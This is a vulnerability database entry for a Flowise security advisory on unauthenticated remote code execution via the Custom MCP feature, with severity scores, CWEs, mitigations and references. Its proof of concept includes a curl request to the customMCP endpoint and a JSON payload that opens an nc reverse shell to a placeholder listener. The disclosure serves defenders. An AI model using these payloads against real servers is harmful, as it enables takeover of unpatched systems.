vulnerability_id: VCID-7uza-xmut-9fhz
aliases:
  - GHSA-6933-jpx5-q87q
summary: |
  Flowise has unsandboxed remote code execution via Custom MCP
  ### Summary
  The Custom MCPs feature is designed to execute OS commands, for instance, using tools like `npx` to spin up local MCP Servers. However, Flowise's inherent authentication and authorization model is minimal and lacks role-based access controls (RBAC). Furthermore, the default installation of Flowise operates without authentication unless explicitly configured using the `FLOWISE_USERNAME` and `FLOWISE_PASSWORD` environment variables.

  This combination presents a significant security risk, potentially allowing users on the platform to execute unsandboxed system commands. This can result in Remote Code Execution (RCE) and complete compromise of the running platform container or server.

  ### PoC
  1. Follow the provided instructions for running the app using Docker Compose (or other methods of your choosing such as `npx`, `pnpm`, etc):
     https://github.com/FlowiseAI/Flowise?tab=readme-ov-file#-docker

  2. Create a new file named `payload.json` somewhere in your machine, with the following data:
  ```
  {"inputs":{"mcpServerConfig":{"command": "touch","args": ["/tmp/yofitofi"]}},"loadMethod":"listActions"}
  ```

  3. Send the following `curl` request using the `payload.json` file created above with the following command:
  ```
  curl -XPOST -H "x-request-from: internal" -H "Content-Type: application/json" --data @payload.json "http://localhost:3000/api/v1/node-load-method/customMCP"
  ```

  4. Observe that a new file named `yofitofi` is created under `/tmp` folder.

  Similarily, we can use the same technique to gain a reverse shell using the built-in `nc` utility with the following JSON payload:
  ```
  {"inputs":{"mcpServerConfig":{"command": "nc","args": [
  "<LISTENER_IP_ADDRESS>","<LISTENER_PORT>","-e","/bin/sh"
  ]}},
  "loadMethod":"listActions"}
  ```

  ![Pasted image 20250420132335](https://github.com/user-attachments/assets/b41093b9-a0d7-415e-bf9b-b8cbce7183d6)

  ### Impact
  Remote code execution

  ### Mitigation
  - Consider adding additional access controls surronding sensitive functionality such as Custom MCP, e.g. only users with "Admin" roles will be able to configure new Custom MCPs within the platform.
  - Consider disabling the Custom MCP feature by default, with a clear disclaimer for end users on the implications of enabling this feature.
  - Consider running Custom MCPs within a sandboxed environment

  ### Credit
  The vulnerability was discovered by Assaf Levkovich of the JFrog Security Research team.
severities:
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-6933-jpx5-q87q
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/FlowiseAI/Flowise
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/FlowiseAI/Flowise/commit/ac7cf30e019cde54905bf09b5d3fe1c6ba42f9b9
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/FlowiseAI/Flowise/pull/5201
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.0.6
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6933-jpx5-q87q
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6933-jpx5-q87q
weaknesses:
  - CWE-862
  - CWE-78
  - CWE-1035
  - CWE-937
references:
  - url: https://github.com/FlowiseAI/Flowise
    reference_type:
    reference_id:
  - url: https://github.com/FlowiseAI/Flowise/commit/ac7cf30e019cde54905bf09b5d3fe1c6ba42f9b9
    reference_type:
    reference_id:
  - url: https://github.com/FlowiseAI/Flowise/pull/5201
    reference_type:
    reference_id:
  - url: https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.0.6
    reference_type:
    reference_id:
  - url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6933-jpx5-q87q
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-6933-jpx5-q87q
    reference_type:
    reference_id: GHSA-6933-jpx5-q87q
